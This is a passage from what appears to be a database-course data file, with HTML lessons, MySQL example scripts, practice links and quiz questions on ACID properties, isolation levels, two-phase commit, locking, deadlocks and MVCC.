constraints satisfied</td><td>Application logic + DB constraints</td></tr><tr><td><b>Isolation</b></td><td>Concurrent transactions don\'t interfere with each other</td><td>Concurrency control (locks, MVCC)</td></tr><tr><td><b>Durability</b></td><td>Once committed, changes survive crashes</td><td>Write-Ahead Log (WAL), redo log</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, explain ACID with the classic bank transfer example: transferring $500 from Account A to Account B. Atomicity = both debits and credits happen or neither. Consistency = total balance is preserved. Isolation = concurrent transfers don\'t see partial states. Durability = committed transfer survives a power failure.</div></div><div class="learn-section"><div class="learn-h">Transaction States</div><p class="learn-p">A transaction goes through these states:</p><ol class="learn-list"><li><b>Active</b> — Transaction is executing operations</li><li><b>Partially Committed</b> — Final operation executed, waiting for commit</li><li><b>Committed</b> — Changes made permanent</li><li><b>Failed</b> — An error occurred, cannot proceed</li><li><b>Aborted</b> — Rolled back, database restored to pre-transaction state</li></ol><p class="learn-p">After abort, the transaction can be <b>restarted</b> (if the failure was transient) or <b>killed</b> (if the failure is permanent, like a constraint violation).</p></div><div class="learn-section"><div class="learn-h">Problems in Concurrent Transactions</div><p class="learn-p">Without proper isolation, concurrent transactions can cause these <b>anomalies</b>:</p><table class="learn-table"><tr><th>Anomaly</th><th>Description</th><th>Example</th></tr><tr><td><b>Dirty Read</b></td><td>T2 reads uncommitted data written by T1; T1 later rolls back</td><td>T1 updates salary to 100K (not committed). T2 reads 100K. T1 rolls back.</td></tr><tr><td><b>Non-repeatable Read</b></td><td>T1 reads a value, T2 modifies it and commits, T1 re-reads and gets a different value</td><td>T1 reads salary=80K. T2 updates to 90K and commits. T1 re-reads: salary=90K.</td></tr><tr><td><b>Phantom Read</b></td><td>T1 reads a set of rows, T2 inserts/deletes rows that match T1\'s condition, T1 re-reads and gets different rows</td><td>T1: SELECT * WHERE dept=\'Eng\' (3 rows). T2 inserts a new Eng employee. T1 re-reads: 4 rows.</td></tr><tr><td><b>Lost Update</b></td><td>Two transactions read the same value and update it; one update is lost</td><td>Both T1 and T2 read balance=1000. T1 sets 1100, T2 sets 1200. Final: 1200 (T1\'s update lost).</td></tr></table></div><div class="learn-section"><div class="learn-h">SQL Isolation Levels</div><p class="learn-p">SQL standard defines four isolation levels, trading off correctness for performance:</p><table class="learn-table"><tr><th>Isolation Level</th><th>Dirty Read</th><th>Non-repeatable Read</th><th>Phantom Read</th></tr><tr><td>READ UNCOMMITTED</td><td>Possible</td><td>Possible</td><td>Possible</td></tr><tr><td>READ COMMITTED</td><td>Prevented</td><td>Possible</td><td>Possible</td></tr><tr><td>REPEATABLE READ</td><td>Prevented</td><td>Prevented</td><td>Possible</td></tr><tr><td>SERIALIZABLE</td><td>Prevented</td><td>Prevented</td><td>Prevented</td></tr></table><div class="learn-code">-- Set isolation level\nSET TRANSACTION ISOLATION LEVEL REPEATABLE READ;\n\n-- Or for the session\nSET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;</div><p class="learn-p"><b>Default isolation levels</b>:</p><ul class="learn-list"><li><b>MySQL (InnoDB)</b>: REPEATABLE READ (but uses next-key locking to also prevent phantoms in practice)</li><li><b>PostgreSQL</b>: READ COMMITTED</li><li><b>SQL Server</b>: READ COMMITTED</li><li><b>Oracle</b>: READ COMMITTED</li></ul><div class="learn-warn"><b>Warning:</b> SERIALIZABLE provides the strongest guarantees but severely limits concurrency. In practice, most systems use READ COMMITTED or REPEATABLE READ with application-level optimistic concurrency control.</div></div><div class="learn-section"><div class="learn-h">Serializability</div><p class="learn-p">A schedule (sequence of operations from concurrent transactions) is <b>serializable</b> if its result is equivalent to some serial execution of the transactions.</p><ul class="learn-list"><li><b>Conflict Serializability</b>: Two operations conflict if they are from different transactions, access the same data, and at least one is a write. A schedule is conflict-serializable if it can be transformed into a serial schedule by swapping non-conflicting operations. Tested using a <b>precedence graph</b> — if acyclic, the schedule is conflict-serializable.</li><li><b>View Serializability</b>: Weaker condition based on reads-from and final-write relationships. Every conflict-serializable schedule is view-serializable, but not vice versa.</li></ul><div class="learn-code">-- Precedence graph example\n-- T1: R(A), W(A)     T2: R(A), W(A)\n-- Schedule: R1(A) R2(A) W1(A) W2(A)\n-- Conflicts: R1-W2(A): T1->T2, R2-W1(A): T2->T1\n-- Cycle exists! NOT conflict-serializable.</div><div class="learn-tip"><b>Tip:</b> To check conflict serializability: (1) identify all conflicting pairs, (2) draw directed edges in the precedence graph, (3) check for cycles. No cycle = conflict serializable.</div></div><div class="learn-section"><div class="learn-h">Distributed Transactions: Two-Phase Commit (2PC)</div><p class="learn-p">When a transaction spans <b>multiple databases or services</b>, a single COMMIT is not enough. <b>2PC</b> is a protocol that ensures all participants either commit or abort together.</p><div class="learn-code">2PC Protocol:\n\nCoordinator                  Participants (DB1, DB2, ...)\n    |                              |\n    |--- Phase 1: PREPARE --------&gt;|\n    |    "Can you commit?"          |  Each participant:\n    |                               |  - Writes redo/undo logs\n    |&lt;-- VOTE (YES or NO) ---------|  - Acquires locks\n    |                               |  - Replies YES (ready) or NO\n    |\n    | If ALL vote YES:\n    |--- Phase 2: COMMIT ----------&gt;|  Participants commit &amp; release locks\n    |&lt;-- ACK -----------------------|\n    |\n    | If ANY votes NO:\n    |--- Phase 2: ABORT -----------&gt;|  Participants rollback &amp; release locks\n    |&lt;-- ACK -----------------------|</div><p class="learn-p"><b>2PC guarantees atomicity</b> across distributed systems but has a critical flaw: if the coordinator crashes after sending PREPARE but before sending COMMIT/ABORT, participants are <b>blocked</b> — they hold locks indefinitely, waiting for a decision they\'ll never receive.</p></div><div class="learn-section"><div class="learn-h">Three-Phase Commit (3PC)</div><p class="learn-p"><b>3PC</b> adds a <b>PRE-COMMIT</b> phase between PREPARE and COMMIT to reduce blocking:</p><div class="learn-code">3PC Protocol:\nPhase 1: PREPARE    → Participants vote YES/NO (same as 2PC)\nPhase 2: PRE-COMMIT → Coordinator tells all "we WILL commit"\n                      (participants can now safely commit on timeout)\nPhase 3: COMMIT     → Actual commit\n\nKey difference: If coordinator crashes after PRE-COMMIT,\nparticipants can safely commit on timeout (they know everyone\nvoted YES). In 2PC, they\'d be stuck.</div><table class="learn-table"><tr><th>Feature</th><th>2PC</th><th>3PC</th></tr><tr><td>Blocking on coordinator failure</td><td>Yes (major flaw)</td><td>No (participants can decide)</td></tr><tr><td>Message complexity</td><td>Lower (2 rounds)</td><td>Higher (3 rounds)</td></tr><tr><td>Network partition tolerance</td><td>No</td><td>No (can cause inconsistency)</td></tr><tr><td>Used in practice</td><td>Yes (XA transactions, databases)</td><td>Rarely (Saga pattern preferred)</td></tr></table><div class="learn-tip"><b>Interview tip:</b> In modern microservice architectures, 2PC/3PC are largely replaced by the <b>Saga pattern</b> — a sequence of local transactions with compensating actions for rollback. Each service commits locally and publishes an event; if a step fails, compensating transactions undo previous steps.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Explain each ACID property with a concrete example.</b><br>A: Consider transferring $500 from Account A to Account B. <b>Atomicity</b>: if the debit from A succeeds but the credit to B fails, the entire transaction rolls back — A gets its $500 back. <b>Consistency</b>: the total balance across all accounts is preserved; if A had $1000 and B had $2000, the total remains $3000 after the transfer. <b>Isolation</b>: if another transaction reads A\'s balance concurrently, it sees either the pre-transfer or post-transfer value, never a partial state where A is debited but B is not yet credited. <b>Durability</b>: once the transfer commits, even if the server crashes immediately after, the transfer is permanent — ensured by the Write-Ahead Log (WAL).</p><p class="learn-p"><b>Q2: What anomalies does each isolation level prevent?</b><br>A: <b>READ UNCOMMITTED</b>: prevents nothing — dirty reads, non-repeatable reads, and phantom reads are all possible. <b>READ COMMITTED</b>: prevents dirty reads by only showing committed data, but non-repeatable reads and phantoms can still occur. <b>REPEATABLE READ</b>: prevents dirty and non-repeatable reads by locking read rows for the transaction\'s duration, but phantoms (new rows matching a condition) can still appear. <b>SERIALIZABLE</b>: prevents all three anomalies, typically using range locks or predicate locks to block phantom inserts.</p><p class="learn-p"><b>Q3: What is the practical difference between READ COMMITTED and REPEATABLE READ?</b><br>A: At READ COMMITTED, each query within a transaction sees the latest committed data — so if another transaction commits between two SELECTs, the same query can return different results. At REPEATABLE READ, the transaction sees a consistent snapshot from its start — re-reading the same row always returns the same value. In PostgreSQL, REPEATABLE READ uses snapshot isolation (MVCC). In MySQL InnoDB, REPEATABLE READ also uses next-key locking which prevents phantoms in practice, making it behave closer to SERIALIZABLE.</p><p class="learn-p"><b>Q4: What is the difference between conflict serializability and view serializability?</b><br>A: Conflict serializability is checked by building a precedence graph from conflicting operations (same data item, different transactions, at least one write) — if acyclic, the schedule is conflict-serializable. View serializability is a weaker condition: a schedule S is view-serializable if there exists a serial schedule S\' where (1) each transaction reads-from the same writer, (2) the final write on each item is by the same transaction. Every conflict-serializable schedule is view-serializable, but not vice versa. Testing view serializability is NP-complete, so conflict serializability is used in practice.</p><p class="learn-p"><b>Q5: Explain the Two-Phase Commit (2PC) protocol and its main limitation.</b><br>A: 2PC coordinates distributed transactions across multiple nodes. In Phase 1 (Prepare), the coordinator asks all participants to vote YES/NO. Each participant writes redo/undo logs and acquires locks before voting. In Phase 2 (Commit/Abort), if all vote YES, the coordinator sends COMMIT; otherwise ABORT. The main limitation is <b>blocking</b>: if the coordinator crashes after PREPARE but before Phase 2, participants are stuck holding locks indefinitely, waiting for a decision. 3PC addresses this by adding a PRE-COMMIT phase, but modern systems prefer the Saga pattern instead.</p><p class="learn-p"><b>Q6: What is a lost update anomaly, and how do you prevent it?</b><br>A: A lost update occurs when two transactions read the same value, compute new values based on it, and both write — the first write is overwritten and lost. For example, both T1 and T2 read balance=1000. T1 writes 1100, T2 writes 1200. T1\'s update is lost. Prevention strategies: (1) Use SELECT ... FOR UPDATE to acquire an exclusive lock before reading. (2) Use SERIALIZABLE isolation level. (3) Implement optimistic concurrency control with a version column — UPDATE ... WHERE version = expected_version, and retry if zero rows affected.</p><p class="learn-p"><b>Q7: What is the Write-Ahead Log (WAL) and why is it essential?</b><br>A: The WAL is a sequential log where all modifications are written <b>before</b> being applied to the actual data pages. This ensures <b>durability</b> (committed changes survive crashes) and <b>atomicity</b> (uncommitted changes can be undone). On crash recovery, the DBMS replays the WAL: redo committed transactions whose data pages were not flushed, and undo uncommitted transactions that partially modified pages. WAL is sequential I/O, which is much faster than the random I/O of updating data pages directly.</p></div>',
          code: `-- =============================================
-- ACID Properties & Isolation Levels
-- =============================================

-- Setup
CREATE TABLE Accounts (
    acc_id   INT PRIMARY KEY,
    name     VARCHAR(100),
    balance  DECIMAL(12,2) CHECK (balance >= 0)
);
INSERT INTO Accounts VALUES (1, 'Alice', 10000), (2, 'Bob', 5000);

-- ===== ATOMICITY: Bank Transfer =====
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 3000 WHERE acc_id = 1;
    UPDATE Accounts SET balance = balance + 3000 WHERE acc_id = 2;
    -- If any statement fails, rollback both
COMMIT;

-- With error handling
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 3000 WHERE acc_id = 1;
    -- Simulate error: this would violate CHECK constraint
    -- UPDATE Accounts SET balance = balance - 99999 WHERE acc_id = 1;
ROLLBACK;  -- Undo everything if error detected

-- ===== SAVEPOINTS =====
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 1000 WHERE acc_id = 1;
    SAVEPOINT sp1;
    UPDATE Accounts SET balance = balance + 1000 WHERE acc_id = 2;
    -- Oops, wrong account. Rollback to savepoint
    ROLLBACK TO sp1;
    UPDATE Accounts SET balance = balance + 1000 WHERE acc_id = 3;
COMMIT;

-- ===== ISOLATION LEVELS =====

-- Session 1: Read Uncommitted (dirty reads possible)
SET SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;
-- May see uncommitted data from other transactions
COMMIT;

-- Session 1: Read Committed (no dirty reads)
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 10000
-- Another transaction commits: balance = 7000
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 7000 (different!)
COMMIT;

-- Session 1: Repeatable Read (consistent reads within transaction)
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 10000
-- Another transaction commits: balance = 7000
SELECT balance FROM Accounts WHERE acc_id = 1;  -- still reads 10000!
COMMIT;

-- Session 1: Serializable (full isolation)
SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE;
START TRANSACTION;
SELECT * FROM Accounts WHERE balance > 5000;
-- Other transactions cannot insert/update rows matching this condition
COMMIT;

-- ===== CHECKING ISOLATION LEVEL =====
SELECT @@transaction_isolation;  -- MySQL 8+
-- or
SELECT @@tx_isolation;           -- MySQL 5.x

-- ===== DEADLOCK EXAMPLE =====
-- Session 1:
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1; -- locks row 1
-- UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2; -- waits for row 2

-- Session 2 (concurrent):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 200 WHERE acc_id = 2; -- locks row 2
-- UPDATE Accounts SET balance = balance + 200 WHERE acc_id = 1; -- waits for row 1
-- DEADLOCK! DBMS detects and rolls back one transaction.`,
          problems: [
            ['ACID Properties', 'https://www.geeksforgeeks.org/acid-properties-in-dbms/', 'Easy'],
            ['Conflict Serializability', 'https://www.geeksforgeeks.org/conflict-serializability-in-dbms/', 'Medium'],
            ['Isolation Levels', 'https://www.geeksforgeeks.org/transaction-isolation-levels-dbms/', 'Medium'],
            ['Precedence Graph', 'https://www.geeksforgeeks.org/precedence-graph-for-testing-conflict-serializability-in-dbms/', 'Hard'],
            ['View Serializability', 'https://www.geeksforgeeks.org/view-serializability-in-dbms/', 'Hard']
          ],
          mcqs: [
            {q: 'Which ACID property is ensured by the Write-Ahead Log (WAL)?', o: ['Atomicity', 'Consistency', 'Isolation', 'Durability'], a: 3},
            {q: 'At which isolation level can a dirty read occur?', o: ['READ UNCOMMITTED', 'READ COMMITTED', 'REPEATABLE READ', 'SERIALIZABLE'], a: 0},
            {q: 'A precedence graph for a schedule is acyclic. This means the schedule is:', o: ['Not serializable', 'View serializable only', 'Conflict serializable', 'Neither conflict nor view serializable'], a: 2},
            {q: 'Which ACID property ensures that a committed transaction survives a system crash?', o: ['Atomicity', 'Consistency', 'Isolation', 'Durability'], a: 3},
            {q: 'At which isolation level are phantom reads first prevented?', o: ['READ UNCOMMITTED', 'READ COMMITTED', 'REPEATABLE READ', 'SERIALIZABLE'], a: 3},
            {q: 'In the Two-Phase Commit protocol, if the coordinator crashes after sending PREPARE but before COMMIT/ABORT:', o: ['All participants commit automatically', 'All participants abort automatically', 'Participants are blocked waiting for a decision', 'Participants independently decide based on timeouts'], a: 2},
            {q: 'Every conflict-serializable schedule is also:', o: ['View serializable', 'Strictly two-phase locked', 'Deadlock-free', 'Recoverable'], a: 0}
          ]
        }
      ]
    },
    {
      id: 'conc', t: 'Concurrency Control',
      topics: [
        {
          t: 'Concurrency Control (Lock-Based, 2PL, MVCC, Timestamp Ordering)',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Picture a high-frequency trading system processing thousands of buy and sell orders per second. Each trade must update portfolio positions, cash balances, and risk metrics atomically. If two concurrent trades on the same stock both read the current position of 100 shares, one buying 50 and another selling 30, the final position should be 120 — but without proper concurrency control, both could write based on the stale value of 100, producing either 150 or 70, both catastrophically wrong. <b>Lost updates</b>, <b>inconsistent reads</b>, and <b>phantom trades</b> are not academic curiosities — they are real bugs that cost real money.</p><p class="learn-p">Concurrency control is a <b>high-value interview topic</b> because it sits at the intersection of theory and practice. Interviewers want to know: How does 2PL guarantee serializability? What are the trade-offs between pessimistic (locking) and optimistic (MVCC) approaches? When do deadlocks arise and how are they handled? Understanding these mechanisms deeply demonstrates you can reason about correctness in concurrent systems — a critical skill for any backend or infrastructure role.</p></div><div class="learn-section"><div class="learn-h">Why Concurrency Control?</div><p class="learn-p"><b>Concurrency control</b> ensures that concurrent transactions execute correctly — producing results equivalent to some serial execution — while maximizing throughput. Without it, transactions can interfere with each other, causing anomalies like dirty reads, lost updates, and inconsistent retrievals.</p><p class="learn-p">The main approaches to concurrency control are:</p><ol class="learn-list"><li><b>Lock-based protocols</b> (pessimistic)</li><li><b>Timestamp ordering</b> (optimistic/pessimistic)</li><li><b>Multiversion Concurrency Control (MVCC)</b></li><li><b>Optimistic Concurrency Control (OCC)</b></li></ol></div><div class="learn-section"><div class="learn-h">Lock-Based Concurrency Control</div><p class="learn-p">Transactions acquire <b>locks</b> on data items before accessing them. Lock types:</p><table class="learn-table"><tr><th>Lock Type</th><th>Also Called</th><th>Allows</th></tr><tr><td>Shared (S)</td><td>Read lock</td><td>Multiple transactions can hold S locks simultaneously</td></tr><tr><td>Exclusive (X)</td><td>Write lock</td><td>Only one transaction can hold X lock; no other S or X allowed</td></tr></table><p class="learn-p"><b>Lock compatibility matrix:</b></p><table class="learn-table"><tr><th></th><th>S held</th><th>X held</th></tr><tr><td>Request S</td><td>Granted</td><td>Wait</td></tr><tr><td>Request X</td><td>Wait</td><td>Wait</td></tr></table><div class="learn-warn"><b>Warning:</b> Simple locking without a protocol does not guarantee serializability. Consider: T1 locks A, reads A, unlocks A, then locks B, writes B, unlocks B. Another transaction can modify A between T1\'s unlock and T1\'s lock of B, causing inconsistency.</div></div><div class="learn-section"><div class="learn-h">Two-Phase Locking (2PL)</div><p class="learn-p"><b>2PL</b> is the most widely used lock-based protocol. It divides a transaction into two phases:</p><ol class="learn-list"><li><b>Growing phase</b>: Transaction may acquire locks but <b>cannot release</b> any lock</li><li><b>Shrinking phase</b>: Transaction may release locks but <b>cannot acquire</b> any new lock</li></ol><p class="learn-p">2PL guarantees <b>conflict serializability</b> but does <b>not</b> prevent deadlocks.</p><p class="learn-p"><b>Variants of 2PL:</b></p><table class="learn-table"><tr><th>Variant</th><th>Description</th><th>Prevents Cascading Abort?</th></tr><tr><td>Basic 2PL</td><td>Locks released in shrinking phase</td><td>No</td></tr><tr><td>Strict 2PL</td><td>All X (write) locks held until commit/abort</td><td>Yes</td></tr><tr><td>Rigorous 2PL</td><td>ALL locks (S and X) held until commit/abort</td><td>Yes + simpler</td></tr></table><div class="learn-tip"><b>Tip:</b> Most practical database systems use <b>Strict 2PL</b>. It ensures that no other transaction reads or writes data modified by a transaction until it commits, preventing cascading aborts.</div></div><div class="learn-section"><div class="learn-h">Deadlock Handling</div><p class="learn-p">A <b>deadlock</b> occurs when two or more transactions are waiting for each other\'s locks, forming a cycle.</p><p class="learn-p"><b>Deadlock prevention</b> (avoid deadlocks before they happen):</p><ul class="learn-list"><li><b>Wait-Die</b> (non-preemptive): Older transaction waits for younger; younger transaction is aborted (dies) if it requests a lock held by an older one.</li><li><b>Wound-Wait</b> (preemptive): Older transaction "wounds" (aborts) younger; younger transaction waits for older.</li></ul><p class="learn-p"><b>Deadlock detection</b>: Build a <b>wait-for graph</b>. If a cycle exists, a deadlock is detected. One transaction in the cycle is chosen as a <b>victim</b> and rolled back.</p><p class="learn-p"><b>Deadlock detection</b> is used by most modern DBMS (e.g., InnoDB detects deadlocks and rolls back the transaction with the fewest locks).</p></div><div class="learn-section"><div class="learn-h">Timestamp Ordering Protocol</div><p class="learn-p">Each transaction T is assigned a unique <b>timestamp TS(T)</b> when it starts. The protocol ensures that conflicting operations execute in timestamp order.</p><p class="learn-p">For each data item Q, maintain:</p><ul class="learn-list"><li><b>W-timestamp(Q)</b>: Largest TS of any transaction that successfully wrote Q</li><li><b>R-timestamp(Q)</b>: Largest TS of any transaction that successfully read Q</li></ul><p class="learn-p"><b>Read rule</b>: T wants to read Q. If TS(T) &lt; W-timestamp(Q), T is too old — reading a value that was already overwritten. T is rolled back.</p><p class="learn-p"><b>Write rule</b>: T wants to write Q. If TS(T) &lt; R-timestamp(Q), T is trying to overwrite a value already read by a newer transaction. T is rolled back. If TS(T) &lt; W-timestamp(Q), T\'s write is obsolete — use <b>Thomas\' Write Rule</b> to simply ignore the write (skip it) instead of aborting.</p></div><div class="learn-section"><div class="learn-h">Multiversion Concurrency Control (MVCC)</div><p class="learn-p"><b>MVCC</b> maintains <b>multiple versions</b> of each data item. Readers see a <b>consistent snapshot</b> from their transaction\'s start time, while writers create new versions. This means <b>readers never block writers, and writers never block readers</b>.</p><p class="learn-p">How MVCC works:</p><ol class="learn-list"><li>Each row has hidden version fields (e.g., <code>created_txn_id</code> and <code>deleted_txn_id</code>)</li><li>A read sees the version that was latest at the transaction\'s start time</li><li>A write creates a new version rather than overwriting</li><li>Old versions are garbage-collected when no transaction needs them</li></ol><p class="learn-p"><b>Used by</b>: PostgreSQL, MySQL InnoDB, Oracle, SQL Server (snapshot isolation)</p><div class="learn-tip"><b>Tip:</b> MVCC is the reason PostgreSQL and InnoDB can offer high concurrency. In PostgreSQL, every UPDATE actually creates a new row version (tuple), and the old version is later removed by VACUUM.</div></div><div class="learn-section"><div class="learn-h">Lock Granularity</div><p class="learn-p">Locks can be applied at different levels of granularity:</p><ul class="learn-list"><li><b>Row-level</b> — Most granular, highest concurrency, most overhead</li><li><b>Page-level</b> — Locks a disk page (group of rows)</li><li><b>Table-level</b> — Least granular, lowest concurrency, least overhead</li><li><b>Database-level</b> — Entire database locked</li></ul><p class="learn-p"><b>Intention locks</b> (IS, IX, SIX) allow a transaction to signal its intent to acquire finer-grained locks, enabling the system to check compatibility without scanning all lower-level locks.</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Explain 2PL and its variants. Why does Strict 2PL prevent cascading aborts?</b><br>A: Two-Phase Locking divides a transaction into a growing phase (only acquires locks) and a shrinking phase (only releases locks). This guarantees conflict serializability. In <b>Basic 2PL</b>, locks can be released before commit, so another transaction T2 might read data written by T1, and if T1 later aborts, T2 must also abort (cascading abort). <b>Strict 2PL</b> holds all exclusive (write) locks until commit/abort, so no other transaction can read uncommitted data — preventing cascading aborts. <b>Rigorous 2PL</b> holds all locks (shared and exclusive) until commit, which is even simpler but more restrictive.</p><p class="learn-p"><b>Q2: Compare deadlock prevention and deadlock detection. Which is used in practice?</b><br>A: <b>Deadlock prevention</b> uses transaction timestamps to decide who waits and who aborts: Wait-Die (non-preemptive) lets older transactions wait for younger ones but aborts younger transactions requesting locks held by older ones; Wound-Wait (preemptive) lets older transactions abort younger ones but makes younger transactions wait. <b>Deadlock detection</b> periodically builds a wait-for graph and checks for cycles — if found, one transaction (the victim) is rolled back. In practice, most DBMS use detection (e.g., InnoDB checks for deadlocks on every lock wait). Prevention is more common in distributed systems where building a global wait-for graph is expensive.</p><p class="learn-p"><b>Q3: How does MVCC work internally in PostgreSQL or InnoDB?</b><br>A: In <b>PostgreSQL</b>, each row tuple has xmin (creating transaction ID) and xmax (deleting/updating transaction ID). An UPDATE creates a new tuple with a new xmin and marks the old tuple with xmax. A reading transaction sees tuples where xmin is committed and before its snapshot, and xmax is either empty or from a transaction not yet visible. Dead tuples are cleaned up by VACUUM. In <b>InnoDB</b>, the undo log stores previous versions. When a row is updated, the new version is written in-place and the old version is saved in the undo log. Readers follow the undo log chain to find the version visible to their snapshot.</p><p class="learn-p"><b>Q4: What is Thomas\' Write Rule, and when does it apply?</b><br>A: Thomas\' Write Rule is an optimization for the basic timestamp ordering protocol. Normally, if transaction T tries to write data item Q and TS(T) &lt; W-timestamp(Q), T is rolled back because a newer transaction has already written Q. Thomas\' Write Rule instead <b>skips the write</b> without aborting — since a newer value already exists, T\'s write would be immediately overwritten anyway. This reduces unnecessary aborts. However, it only works with the write rule; if TS(T) &lt; R-timestamp(Q), T must still abort because a newer transaction has already read the old value.</p><p class="learn-p"><b>Q5: What are the trade-offs of lock granularity?</b><br>A: Finer granularity (row-level locks) provides higher concurrency because different transactions can access different rows simultaneously, but it incurs higher overhead — more locks to manage, more memory, and more CPU for lock table lookups. Coarser granularity (table-level locks) has less overhead but severely limits concurrency since an entire table is locked. The solution is <b>intention locks</b>: a transaction first acquires an intention lock at a coarser level (e.g., IX on the table) before acquiring the actual lock at a finer level (e.g., X on a row). This allows the system to quickly check compatibility at the table level without examining every row lock.</p><p class="learn-p"><b>Q6: How does Optimistic Concurrency Control (OCC) differ from pessimistic locking?</b><br>A: Pessimistic approaches (2PL, locks) assume conflicts are likely and prevent them by acquiring locks upfront — this can cause blocking and deadlocks. OCC assumes conflicts are rare and lets transactions proceed without locking. In the validation phase (before commit), the system checks whether the transaction conflicts with any concurrent transaction. If a conflict is detected, the transaction is rolled back and retried. OCC has three phases: read, validate, write. It performs better under low-contention workloads but suffers under high contention due to frequent restarts. A practical variant is <b>version-based OCC</b>, where each row has a version counter and the UPDATE includes a WHERE version = expected_version check.</p><p class="learn-p"><b>Q7: A system uses Strict 2PL and encounters frequent deadlocks. What strategies would you consider?</b><br>A: Several strategies: (1) <b>Lock ordering</b> — ensure all transactions acquire locks in the same global order (e.g., by primary key), eliminating cycles. (2) <b>Lock timeouts</b> — abort transactions that wait too long for a lock, reducing blocked time. (3) <b>Reduce lock duration</b> — minimize the work done while holding locks (avoid network calls or heavy computation inside transactions). (4) <b>Reduce lock scope</b> — use finer-grained locks (row-level vs. table-level). (5) <b>Switch to MVCC</b> — readers no longer block writers, eliminating a major source of lock contention. (6) <b>Application redesign</b> — batch operations or partition data to reduce conflicts.</p></div>',
          code: `-- =============================================
-- Concurrency Control Demonstrations
-- =============================================

-- ===== LOCK-BASED CONTROL =====

-- MySQL InnoDB uses row-level locking by default

-- Shared (read) lock
START TRANSACTION;
SELECT * FROM Accounts WHERE acc_id = 1 LOCK IN SHARE MODE;
-- Other transactions can also read with LOCK IN SHARE MODE
-- but cannot UPDATE until this transaction commits
COMMIT;

-- Exclusive (write) lock
START TRANSACTION;
SELECT * FROM Accounts WHERE acc_id = 1 FOR UPDATE;
-- Exclusive lock: no other transaction can read (with lock) or write
UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;
COMMIT;

-- ===== DEMONSTRATING 2PL =====

-- Strict 2PL (default in InnoDB):
-- All write locks held until COMMIT

-- Transaction T1:
START TRANSACTION;
UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1;
-- X-lock on acc_id=1 acquired, held until COMMIT
UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2;
-- X-lock on acc_id=2 acquired, held until COMMIT
COMMIT;
-- Both locks released at COMMIT (Strict 2PL)

-- ===== DEADLOCK SCENARIO =====

-- Session 1:
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1;
-- -- holds X-lock on acc_id=1
-- -- now tries to lock acc_id=2 (Session 2 holds it)
-- UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2;

-- Session 2 (concurrent):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 50 WHERE acc_id = 2;
-- -- holds X-lock on acc_id=2
-- -- now tries to lock acc_id=1 (Session 1 holds it)
-- UPDATE Accounts SET balance = balance + 50 WHERE acc_id = 1;
-- -- DEADLOCK DETECTED! InnoDB rolls back one transaction.

-- Check for deadlocks:
SHOW ENGINE INNODB STATUS;  -- includes latest deadlock info

-- ===== MVCC in action (MySQL InnoDB) =====

-- Session 1 (REPEATABLE READ):
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;
-- Reads from a consistent snapshot (e.g., balance = 10000)

-- Session 2 (commits between Session 1's reads):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = 7000 WHERE acc_id = 1;
-- COMMIT;

-- Back to Session 1:
SELECT balance FROM Accounts WHERE acc_id = 1;
-- MVCC: Still reads 10000 (from the snapshot at transaction start)
COMMIT;

-- ===== OPTIMISTIC CONCURRENCY CONTROL (Application-Level) =====

-- Step 1: Read with version
SELECT balance, version FROM Accounts WHERE acc_id = 1;
-- Returns: balance=10000, version=5

-- Step 2: Application processes... then writes with version check
UPDATE Accounts
SET balance = 9000, version = version + 1
WHERE acc_id = 1 AND version = 5;
-- If ROW_COUNT() = 0, another transaction modified it => retry!

-- ===== LOCK GRANULARITY =====

-- Table-level lock (MyISAM or explicit)
LOCK TABLES Accounts WRITE;
-- ... operations ...
UNLOCK TABLES;

-- Row-level lock (InnoDB default with indexes)
SELECT * FROM Accounts WHERE acc_id = 1 FOR UPDATE;
-- Only locks the specific row (if acc_id has an index)`,
          problems: [
            ['Two Phase Locking', 'https://www.geeksforgeeks.org/two-phase-locking-protocol/', 'Medium'],
            ['Deadlock Detection', 'https://www.geeksforgeeks.org/deadlock-in-dbms/', 'Medium'],
            ['Timestamp Ordering Protocol', 'https://www.geeksforgeeks.org/timestamp-based-concurrency-control/', 'Medium'],
            ['Lock-Based Protocols', 'https://www.geeksforgeeks.org/lock-based-concurrency-control-protocol-in-dbms/', 'Medium']
          ],
          mcqs: [
            {q: 'Two-Phase Locking (2PL) guarantees:', o: ['Freedom from deadlocks', 'Conflict serializability', 'Both deadlock freedom and serializability', 'View serializability only'], a: 1},
            {q: 'In MVCC, what happens when a reader and writer access the same data concurrently?', o: ['The reader blocks until the writer commits', 'The writer blocks until the reader finishes', 'Both proceed without blocking — reader sees a snapshot', 'A deadlock occurs'], a: 2},
            {q: 'In the Wait-Die deadlock prevention scheme:', o: ['Older transactions always abort', 'Younger transactions wait for older ones', 'Older transactions wait for younger; younger abort if they request a lock held by older', 'All transactions are aborted and restarted'], a: 2},
